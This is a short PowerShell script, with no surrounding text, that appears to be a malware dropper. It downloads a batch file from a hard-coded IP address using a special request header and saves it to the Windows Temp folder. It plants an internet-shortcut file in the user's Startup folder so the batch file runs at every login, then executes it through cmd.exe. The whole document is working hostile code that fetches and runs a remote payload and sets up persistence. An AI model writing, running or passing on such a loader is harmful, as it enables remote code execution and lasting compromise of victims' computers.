$batUrl = "http://147.45.44.131/infopage/wertxcp.bat"
$batFilePath = "C:\Windows\Temp\Pack.bat"
$startupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$urlShortcutPath = Join-Path -Path $startupFolder -ChildPath "App.url"

$headers = @{
    "X-Special-Header" = "qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq"
}

Invoke-WebRequest -Uri $batUrl -Headers $headers -OutFile $batFilePath

if (-Not (Test-Path $batFilePath)) {
    exit
}

$urlContent = @"
[InternetShortcut]
URL=file:///$batFilePath
"@

Set-Content -Path $urlShortcutPath -Value $urlContent -Encoding ASCII

Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$batFilePath`"" -NoNewWindow